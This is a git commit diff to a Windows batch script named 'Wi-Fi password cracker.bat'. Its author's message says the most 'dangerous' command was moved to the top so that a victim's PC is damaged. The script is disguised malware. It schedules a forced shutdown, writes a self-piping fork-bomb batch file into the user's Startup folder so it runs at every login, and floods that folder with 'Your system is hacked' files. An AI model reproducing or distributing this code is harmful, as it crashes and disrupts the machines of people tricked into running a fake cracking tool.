6dabbce676fc2b42deabc1ed766527af43685e08
Varun Banka <bankavarun18@gmail.com>
2023-01-28 21:13:04 +0530

    reordered the commanded
    reordered the commandedtomake it more dangrous
    ive wrote dangrous command at the top so if someone closes it, their pc will be f....ed

--- Wi-Fi password cracker.bat
+++ Wi-Fi password cracker.bat
@@ -6,27 +6,27 @@ shutdown -s -t 600
 CD "%HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup"
 
 :start
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
-echo Your system is hacked > dontDelete%random%.txt
 echo %0|%0 > dontDelete%random%.bat
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
+echo Your system is hacked > dontDelete%random%.txt
 echo Your system is hacked > dontDelete%random%.txt
 echo Your system is hacked > dontDelete%random%.txt
 echo Your system is hacked > dontDelete%random%.txt
